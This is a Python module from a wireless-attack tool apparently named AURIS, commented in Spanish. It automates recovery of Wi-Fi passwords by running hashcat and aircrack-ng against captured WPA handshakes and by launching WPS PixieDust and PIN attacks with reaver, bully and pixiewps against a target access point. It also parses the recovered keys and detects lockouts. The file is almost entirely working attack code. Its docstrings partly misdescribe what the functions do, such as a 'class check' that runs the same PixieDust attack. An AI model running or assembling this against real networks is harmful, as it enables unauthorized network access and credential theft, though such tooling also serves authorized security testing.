"""
AURIS — adapters/cracker.py
Adaptadores de crackeo offline: hashcat y aircrack-ng.

Separar el crackeo del orquestador permite:
  - Testear el crackeo con hashes sintéticos.
  - Cambiar el motor (hashcat → john) sin tocar el pipeline.
  - Controlar con precisión los timeouts de GPU/CPU.
"""

from __future__ import annotations

import os
import re
from dataclasses import dataclass
from typing import Optional

from .tool_runner import ToolResult, run_tool, tool_available


@dataclass
class CrackResult:
    """Resultado de un intento de crackeo offline."""
    status:     str            # "cracked" | "exhausted" | "timeout" | "skipped" | "error"
    password:   Optional[str] = None
    method:     Optional[str] = None
    elapsed_sec: float = 0.0

    @property
    def cracked(self) -> bool:
        return self.status == "cracked" and self.password is not None


# ─── Parsers de salida de herramientas ────────────────────────────────────────

def _parse_hashcat_show(hash_path: str) -> Optional[str]:
    """Recupera la contraseña en claro de hashcat --show."""
    if not tool_available("hashcat"):
        return None
    res = run_tool(["hashcat", "-m", "22000", hash_path, "--show"], timeout=10)
    for line in res.stdout.strip().splitlines():
        line = line.strip()
        if ":" in line:
            parts = line.split(":")
            if len(parts) >= 2 and parts[-1]:
                return parts[-1]
    return None


def _parse_aircrack_output(text: str) -> Optional[str]:
    """Clave en claro desde 'KEY FOUND! [ clave ]'."""
    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", text or "")
    return m.group(1).strip() if m else None


def _parse_reaver_output(text: str) -> dict[str, Optional[str]]:
    """Extrae WPS PIN y WPA PSK de la salida de reaver/bully/pixiewps."""
    creds: dict[str, Optional[str]] = {"pin": None, "psk": None}
    pin_m = re.search(r"(?:wps pin|pin)[:\s]+['\"]?(\d{4,8})['\"]?", text, re.IGNORECASE)
    if pin_m:
        creds["pin"] = pin_m.group(1)
    psk_m = re.search(r"(?:wpa psk|psk|key)[:\s]+['\"]?([^'\r\n]+)['\"]?", text, re.IGNORECASE)
    if psk_m:
        creds["psk"] = psk_m.group(1).strip()
    return creds


# ─── Motores de crackeo ────────────────────────────────────────────────────────

def crack_with_hashcat(
    hash_path: str,
    wordlist: str,
    timeout: int = 900,
    desc: str = "hashcat",
) -> CrackResult:
    """
    Ataca un hash .hc22000 con hashcat y un diccionario dado.

    Retorna CrackResult inmediatamente con status="skipped" si:
      - hashcat no está instalado.
      - El hash_path no existe o está vacío.
      - El wordlist no existe.
    """
    if not tool_available("hashcat"):
        return CrackResult(status="skipped", method="hashcat not available")
    if not os.path.isfile(hash_path) or os.path.getsize(hash_path) == 0:
        return CrackResult(status="skipped", method="hash file missing")
    if not os.path.isfile(wordlist):
        return CrackResult(status="skipped", method=f"wordlist not found: {wordlist}")

    res = run_tool(
        [
            "hashcat", "-m", "22000",
            hash_path, wordlist,
            "--quiet", "--status", "--status-timer=30",
        ],
        timeout=timeout,
        desc=desc,
    )

    if res.timed_out:
        return CrackResult(status="timeout", elapsed_sec=res.elapsed_sec)

    if res.returncode == 0:
        password = _parse_hashcat_show(hash_path) or "recovered (hashcat)"
        return CrackResult(
            status="cracked", password=password,
            method="hashcat -m 22000", elapsed_sec=res.elapsed_sec,
        )

    return CrackResult(status="exhausted", elapsed_sec=res.elapsed_sec)


def crack_with_aircrack(
    cap_path: str,
    wordlist: str,
    bssid: str,
    timeout: int = 120,
    desc: str = "aircrack-ng",
) -> CrackResult:
    """
    Ataca un .cap con aircrack-ng (fallback sin hashcat/GPU).
    """
    if not tool_available("aircrack-ng"):
        return CrackResult(status="skipped", method="aircrack-ng not available")
    if not os.path.isfile(cap_path) or not os.path.isfile(wordlist):
        return CrackResult(status="skipped", method="cap or wordlist missing")

    res = run_tool(
        ["aircrack-ng", "-w", wordlist, "-b", bssid, "-q", cap_path],
        timeout=timeout,
        desc=desc,
    )

    if res.timed_out:
        return CrackResult(status="timeout", elapsed_sec=res.elapsed_sec)

    password = _parse_aircrack_output(res.stdout)
    if password:
        return CrackResult(
            status="cracked", password=password,
            method="aircrack-ng", elapsed_sec=res.elapsed_sec,
        )
    return CrackResult(status="exhausted", elapsed_sec=res.elapsed_sec)


def attack_wps_pixiedust(
    iface: str,
    bssid: str,
    channel: int,
    timeout: int = 120,
) -> CrackResult:
    """
    Ataque WPS PixieDust usando reaver (con -K 1) o bully (con -d).
    Requiere pixiewps instalado.
    """
    if not tool_available("pixiewps"):
        return CrackResult(status="skipped", method="pixiewps not available")

    if tool_available("reaver"):
        cmd = ["reaver", "-i", iface, "-b", bssid, "-K", "1", "-S", "-v"]
        motor = "reaver+pixiewps"
    elif tool_available("bully"):
        cmd = ["bully", "-b", bssid, "-d", "-c", str(channel), iface]
        motor = "bully+pixiewps"
    else:
        return CrackResult(status="skipped", method="reaver/bully not available")

    res = run_tool(cmd, timeout=timeout, desc=f"WPS PixieDust ({motor})")

    if res.timed_out:
        return CrackResult(status="timeout", elapsed_sec=res.elapsed_sec)

    out = res.combined_output.lower()
    # Lockout WPS — el AP activó rate-limit
    LOCKOUT_MARKERS = (
        "locked", "lockout", "rate limiting", "wps transaction failed",
        "too many", "nack", "0x02", "detected ap rate",
    )
    if any(m in out for m in LOCKOUT_MARKERS):
        return CrackResult(status="locked", method=motor, elapsed_sec=res.elapsed_sec)

    creds = _parse_reaver_output(res.stdout)
    if creds["psk"] or creds["pin"]:
        val = creds["psk"] or f"PIN:{creds['pin']}"
        return CrackResult(
            status="cracked", password=val,
            method=f"WPS PixieDust ({motor})", elapsed_sec=res.elapsed_sec,
        )

    return CrackResult(status="not_found", elapsed_sec=res.elapsed_sec)


def attack_wps_pin_class(
    iface: str,
    bssid: str,
    timeout: int = 180,
) -> CrackResult:
    """
    Valida la clase WPS (PIN de fábrica conocido por familia) mediante reaver/bully.
    NO brute-force masivo: sólo verifica si el AP acepta una clase de PIN conocida.
    """
    if not (tool_available("reaver") or tool_available("bully")):
        return CrackResult(status="skipped", method="reaver/bully not available")

    tool = "reaver" if tool_available("reaver") else "bully"
    res = run_tool(
        [tool, "-i", iface, "-b", bssid, "-K", "1", "-v"],
        timeout=timeout,
        desc=f"WPS clase PIN ({tool})",
    )

    if res.timed_out:
        return CrackResult(status="timeout", elapsed_sec=res.elapsed_sec)

    out_low = res.combined_output.lower()
    LOCKOUT_MARKERS = (
        "locked", "lockout", "rate limiting", "wps transaction failed",
        "too many", "nack", "0x02", "detected ap rate",
    )
    if any(m in out_low for m in LOCKOUT_MARKERS):
        return CrackResult(status="locked", method=tool, elapsed_sec=res.elapsed_sec)

    if "pin" in res.stdout.lower() and "found" in res.stdout.lower():
        creds = _parse_reaver_output(res.stdout)
        val = creds.get("psk") or creds.get("pin") or "PIN de clase detectado"
        return CrackResult(
            status="cracked", password=val,
            method=f"WPS clase ({tool})", elapsed_sec=res.elapsed_sec,
        )

    return CrackResult(status="not_found", elapsed_sec=res.elapsed_sec)
